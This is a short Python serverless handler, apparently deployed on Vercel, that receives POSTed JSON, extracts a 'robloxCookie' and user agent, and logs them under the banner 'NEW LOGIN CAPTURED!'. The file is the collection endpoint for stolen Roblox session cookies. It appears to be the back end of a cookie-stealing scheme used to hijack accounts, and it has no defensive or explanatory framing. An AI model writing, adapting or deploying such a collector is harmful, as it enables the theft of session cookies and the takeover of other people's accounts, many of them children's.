import os
from http.server import BaseHTTPRequestHandler
import json

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the size of the incoming data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            # Convert the raw data into a JSON object
            data = json.loads(post_data.decode('utf-8'))
            
            # Extract the specific data we want
            robloxCookie = data.get('robloxCookie', 'None')
            userAgent = data.get('userAgent', 'None')

            # Print the data to the Vercel Logs
            print("\n" + "="*40)
            print("NEW LOGIN CAPTURED!")
            print("="*40)
            print(f"Roblox Cookie: {robloxCookie}")
            print(f"User Agent: {userAgent}")
            print("="*40 + "\n")
            
        except Exception as e:
            print(f"Error parsing data: {e}")

        # Send a success response back to the browser
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
